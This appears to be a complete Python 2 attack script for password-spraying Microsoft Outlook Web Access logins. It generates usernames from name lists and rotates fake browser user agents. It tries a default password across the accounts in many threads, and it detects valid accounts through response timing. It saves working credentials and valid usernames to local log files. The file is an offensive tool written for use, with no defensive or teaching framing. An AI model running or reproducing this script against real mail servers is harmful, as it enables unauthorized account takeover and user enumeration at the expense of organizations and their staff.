#!/usr/bin/env python

from sys import exit
from sys import stdout
from tm import ThreadManager
from argparse import ArgumentParser
from time import sleep
from re import match
from random import choice
from platform import system
import requests
import os
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.exceptions import Timeout


url = None
proto = None
host = None
path = None
proxy = None

timeout = 1
validate_timeout = 1

verbose = False

valid_login_file = "owa_valid_login.log"
successful_login_file = "owa_successful_login.log"

login_list = []
password_list = []

user_agent_list = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0.2 Safari/602.3.12",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/602.4.8 (KHTML, like Gecko) Version/10.0.3 Safari/602.4.8",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:50.0) Gecko/20100101 Firefox/50.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:50.0) Gecko/20100101 Firefox/50.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0.2 Safari/602.3.12",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:51.0) Gecko/20100101 Firefox/51.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/55.0.2883.87 Chrome/55.0.2883.87 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.4.8 (KHTML, like Gecko) Version/10.0.3 Safari/602.4.8",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:51.0) Gecko/20100101 Firefox/51.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0",
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0.2 Safari/602.3.12",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
    "Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0",
    "Mozilla/5.0 (iPad; CPU OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0 Mobile/14C92 Safari/602.1",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0;  Trident/5.0)",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:50.0) Gecko/20100101 Firefox/50.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586",
    "Mozilla/5.0 (Windows NT 6.1; rv:51.0) Gecko/20100101 Firefox/51.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/53.0.2785.143 Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like Mac OS X) AppleWebKit/602.3.12 (KHTML, like Gecko) Version/10.0 Mobile/14C92 Safari/602.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/602.4.8 (KHTML, like Gecko) Version/10.0.3 Safari/602.4.8",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.100 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Windows NT 5.1; rv:51.0) Gecko/20100101 Firefox/51.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.7.8 (KHTML, like Gecko) Version/9.1.3 Safari/537.86.7",
    "Mozilla/5.0 (Windows NT 5.1; rv:50.0) Gecko/20100101 Firefox/50.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0",
]


class ConsoleOutput:
    info = None
    error = None
    success = None
    warning = None

    def __init__(self):
        self.check_platform()

    def check_platform(self):
        if system() == "Linux" or system() == "Darwin":
            self.info = '\033[1;34m' + '[*]' + '\033[0m' + ' '
            self.error = '\033[1;31m' + '[-]' + '\033[0m' + ' '
            self.success = '\033[1;32m' + '[+]' + '\033[0m' + ' '
            self.warning = '\033[1;33m' + '[!]' + '\033[0m' + ' '
        else:
            self.info = '[*] '
            self.error = '[-] '
            self.success = '[+] '
            self.warning = '[!] '


def create_login_list(country='ru', use_full_name=False):
    try:
        surnames_file = open(os.getcwd() + '/surnames/' + country.lower() + '.txt')
        names_file = open(os.getcwd() + '/names/' + country.lower() + '.txt')
    except IOError:
        print "This country code: \"" + country.upper() + "\" not yet supported!"
        exit(1)

    first_letter_name_list = []
    name_list = []
    names_file.seek(0)

    for name in names_file.readlines():
        name = name.replace('\n', '')
        login_list.append(name)
        if use_full_name:
            name_list.append(name)
        if name[:1] not in first_letter_name_list:
            first_letter_name_list.append(name[:1])

    surnames_file.seek(0)
    surname = surnames_file.readline()
    female_surname = None

    while surname:
        surname = surname.replace('\n', '')

        if country == "ru":
            if not surname.endswith('o'):
                if surname.endswith('iy'):
                    female_surname = surname[:-2] + 'aya'
                else:
                    female_surname = surname + 'a'
            else:
                female_surname = None

        login_list.append(surname)
        if female_surname is not None:
            login_list.append(female_surname)

        for first_letter_name in first_letter_name_list:
            login_list.append(first_letter_name + '.' + surname)
            if female_surname is not None:
                login_list.append(first_letter_name + '.' + female_surname)

        if use_full_name:
            for name in name_list:
                if female_surname is not None:
                    if name.endswith('a'):
                        login_list.append(name + '.' + female_surname)
                    else:
                        login_list.append(name + '.' + surname)
                else:
                    login_list.append(name + '.' + surname)

        surname = surnames_file.readline()

    # For debug
    with open('big_users_list.txt', 'a') as logins_file:
        for login in login_list:
            logins_file.write(login + '\n')

    surnames_file.close()
    names_file.close()


def brute(**positions):
    start_position = int(positions['start'])
    stop_position = int(positions['stop'])

    # stdout.write("Start position: " + str(start_position) + "\n")
    # stdout.write("Stop position: " + str(stop_position) + "\n")

    global url
    global proto
    global host
    global path
    global proxy

    global validate_timeout
    global timeout

    global verbose

    global login_list
    global password_list

    global valid_login_file
    global successful_login_file

    global user_agent_list

    output = ConsoleOutput()

    if url.endswith('/'):
        url = url + 'owa/auth.owa'
    elif url.endswith('/auth.owa'):
        pass
    else:
        url = url + '/owa/auth.owa'

    headers = {
        "Host": host,
        "User-Agent": choice(user_agent_list),
        "Cookie": "PBack=0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close"
    }

    for index in range(start_position - 1, stop_position, 1):
        for password in password_list:
            data = {
                "destination": proto + "://" + host + "/owa",
                "flags": "4",
                "forcedownlevel": "0",
                "username": login_list[index],
                "password": password,
                "isUtf8": "1"
            }

            # stdout.write(output.info + "Check: " + login_list[index] + " " + password + "\n")

            try:
                if proxy is not None:
                    response = requests.post(url, data=data, headers=headers, proxies=proxy,
                                             verify=False, allow_redirects=False, timeout=timeout)
                else:
                    response = requests.post(url, data=data, headers=headers, verify=False,
                                             allow_redirects=False, timeout=timeout)

                if response.status_code == 302:
                    if "Set-Cookie" in response.headers.keys():
                        stdout.write(output.success + "Successful login: " + login_list[index] + " " + password + "\n")
                        with open(successful_login_file, "a") as out_file:
                            out_file.write(login_list[index] + " " + password + "\n")
                    else:
                        if response.elapsed.total_seconds() < validate_timeout:
                            stdout.write(output.info + "User exist: " + login_list[index] + "\n")
                            with open(valid_login_file, "a") as out_file:
                                out_file.write(login_list[index] + "\n")
                        else:
                            if verbose:
                                stdout.write(output.error + "User does not exist: " + login_list[index] + "\n")
            except Timeout:
                if verbose:
                    stdout.write(output.error + "User does not exist: " + login_list[index] + "\n")


if __name__ == "__main__":
    output = ConsoleOutput()

    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

    parser = ArgumentParser(description='OWA brute script')

    parser.add_argument('-u', '--url', type=str, help='Set OWA URL (example: https://owa.test/com/)')
    parser.add_argument('-c', '--country', type=str, help='Set Country code (default: RU)', default='RU')
    parser.add_argument('-t', '--threads', type=int, help='Set number of threads (default: 10)', default='10')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose mode')
    parser.add_argument('-f', '--full_names', action='store_true', help='Use full names (a.jones -> alex.jones)')
    parser.add_argument('-T', '--timeout', type=int, help='Set timeout (default: 1)', default='1')
    parser.add_argument('-V', '--validate_timeout', type=int, help='Set validate timeout (default: 1)', default='1')
    parser.add_argument('-P', '--password', type=str, help='Set password (default: Qq123456)', default='Qq123456')
    parser.add_argument('--proxy', type=str, help='Set proxy (example: https://127.0.0.1:8080)')
    args = parser.parse_args()

    if args.verbose:
        verbose = True

    if args.url is None:
        print output.error + "Please set URL (example: https://owa.test.com/)"
        exit(1)
    else:
        try:
            re = match(r"^(?P<proto>http[s|])://(?P<host>[A-Za-z0-9\-\.]+)(?P<port>:[0-9]+)?(?P<path>.*)$", args.url)
            proto = re.group('proto')
            host = re.group('host')
            port = re.group('port')
            path = re.group('path')
        except AttributeError:
            print output.error + "Bad URL! Normal URL example: https://owa.test.com/"
            exit(1)

        url = args.url
        print output.info + "URL: " + url

    if args.proxy is not None:
        try:
            re = match(r"^(?P<proto>(http[s|]|socks[4|5]))://(?P<host>[A-Za-z0-9\-\.]+)(?P<port>:[0-9]+)$", args.proxy)
            if re.group('port') is not None:
                proxy = {re.group('proto'): str(re.group('host')) + str(re.group('port'))}
            else:
                proxy = {re.group('proto'): str(re.group('host'))}
            print output.info + "Proxy: " + args.proxy
        except AttributeError:
            print output.error + "Bad Proxy! Normal Proxy example: https://127.0.0.1:8080"
            exit(1)

    if args.country is None:
        print output.error + "Please set Country code (2 letters, example: RU)"
        exit(1)
    else:
        if len(args.country) != 2:
            print output.error + "Bad Country code (2 letters, example: RU)"
            exit(1)
        else:
            create_login_list(args.country.lower(), args.full_names)

    timeout = int(args.timeout)

    login_list_len = len(login_list)
    print output.info + "Login list size: " + str(login_list_len)

    valid_login_file = host + "_" + valid_login_file
    successful_login_file = host + "_" + successful_login_file

    print output.info + "Valid logins write to file: " + valid_login_file
    print output.info + "Successful login credentials write to file: " + valid_login_file

    password_list.append(args.password)
    print output.info + "Password: " + args.password

    print output.info + "Number of threads: " + str(args.threads)
    print output.info + "Start brute ..."

    if args.threads > 1:
        tm = ThreadManager(args.threads + 1)
        step = int(login_list_len / args.threads)

        for thread in range(1, args.threads + 1):
            positions = {"start": (step*(thread-1)) + 1, "stop": step*thread}
            tm.add_task(brute, **positions)
            sleep(1)

        tm.wait_for_completion()
    else:
        positions = {"start": 1, "stop": login_list_len}
        brute(**positions)

    exit(0)
